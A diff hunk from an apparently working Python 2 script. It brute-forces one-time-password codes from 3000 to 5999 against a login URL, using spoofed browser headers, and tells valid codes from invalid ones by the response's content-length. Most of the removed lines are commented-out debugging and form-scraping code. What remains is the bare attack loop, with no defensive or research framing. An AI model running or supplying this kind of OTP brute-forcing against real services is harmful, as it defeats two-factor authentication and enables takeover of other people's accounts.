@@ -79,40 +79,11 @@ for x in range(3000,6000):
                 'Referer' : URLLOGIN,
                 'User-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
                 }
-                #r2=session.get(URLLOGIN,headers=header)
-                #print 'test'
-                #soup=BeautifulSoup(r2.content)
-                #viewsttgenerator=soup.find('input',{'name':'__VIEWSTATEGENERATOR'})['value']
-                #eventValidate=soup.find('input',{'name':'__EVENTVALIDATION'})['value']
-                #viewstt=soup.find('input',{'name':'__VIEWSTATE'})['value']
-                #login_data['__VIEWSTATE']=viewstt
-                #login_data['__VIEWSTATEGENERATOR']=viewsttgenerator
-                #login_data['__EVENTVALIDATION']=eventValidate
-                #print viewsttgenerator
-                #print login_data['__VIEWSTATEGENERATOR']
-        #print 1
         r = session.post(URLLOGIN,data=login_data,headers=header)
-        #print r
         if int(r.headers['content-length'])==98:
             print str(x)+" is invalid otp"
         else:
             print str(x)+" is CORRECT OTP!!!"
-                #print r.headers['content-length']
-                #WriteFile=open('nse.html','a')
-                #WriteFile.write(r.content)
-                #if int(r.headers['content-length'])&lt4004:
-                #print r.headers['content-length']
-                #WriteFile=open('nse.html','a')
-                #WriteFile.write(r.content)
-                #if int(r.headers['content-length'])&lt4004:
-                #    WriteFile=open('outputofscrapper22.out','a')
-                #    #WriteFile.write(r.content)
-                #    WriteFile.write("success "+x.rstrip()+" "+(d1+timedelta(days=i)).strftime('%d/%m/%Y'))
-                #    print "success "+x.rstrip()+" "+(d1+timedelta(days=i)).strftime('%d/%m/%Y')
-                #    print x.rstrip()
-                #    break
-                    #print (d1+timedelta(days=i)).strftime('%d/%m/%Y')
-                    #print (d1+timedelta(days=i)).strftime('%d/%m/%Y')
                     
     except Exception:
         print str(x)+" is correct"
